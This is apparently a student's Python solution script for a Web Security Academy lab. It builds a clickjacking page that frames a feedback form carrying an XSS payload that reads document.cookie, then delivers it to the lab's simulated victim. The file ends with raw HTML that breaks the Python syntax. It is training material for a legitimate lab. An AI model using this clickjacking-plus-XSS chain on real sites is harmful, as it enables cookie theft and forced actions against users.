import requests
from bs4 import BeautifulSoup

site = 'acfb1f781e29fdc7c0931134007300e3.web-security-academy.net'

s = requests.Session()
site_url = f'https://{site}/'
resp = s.get(site_url)
soup = BeautifulSoup(resp.text,'html.parser')
exploit_url = soup.find('a', {'id':'exploit-link'}).get('href')

# exploit_html = f'''<style>
#    iframe {{
#        position:relative;
#        width: 700px;
#        height: 700px;
#        opacity: 0.3;
#        z-index: 2;
#    }}
#    div {{
#        position:absolute;
#        top:530px;
#        left:60px;
#        z-index: 1;
#    }}
# </style>
# <div>Click me</div>
# <iframe src="https://{site}/my-account?email=elafleur@pdx.edu"></iframe>
# '''

exploit_html = f'''<style>
   iframe {{
       position: relative;
       width: 700px;
       height: 1000px;
       opacity: 0.3;
       z-index: 2;
   }}
   div {{
       position: absolute;
       top: 100px;
       left: 100px;
       z-index: 1;
   }}
</style>
<div>Click me</div>
<iframe src="{site}/feedback?name=<img src=1 onerror=alert(document.cookie)>&email=elafleur@pdx.edu&subject=test&message=test#feedbackResult"></iframe>
'''

formData = {
    'urlIsHttps': 'on',
    'responseFile': '/exploit',
    'responseHead': 'HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8',
    'responseBody': exploit_html,
    'formAction': 'DELIVER_TO_VICTIM'
}

resp = s.post(exploit_url, data=formData)


#To complete 3.4.5
<style>
	iframe {
		position: relative;
                width: 700px;
                height: 1000px;
                opacity: 0.3;
                z-index: 2;
	}
	div {
		position: absolute;
                top: 800px;
                left: 50px;
                z-index: 1;
	}
</style>
<div>Test me</div>
<iframe
src="https://acfb1f781e29fdc7c0931134007300e3.web-security-academy.net/feedback?name=<img src=1 onerror=alert(document.cookie)>&email=elafleur@pdx.edu&subject=test&message=test#feedbackResult"></iframe>
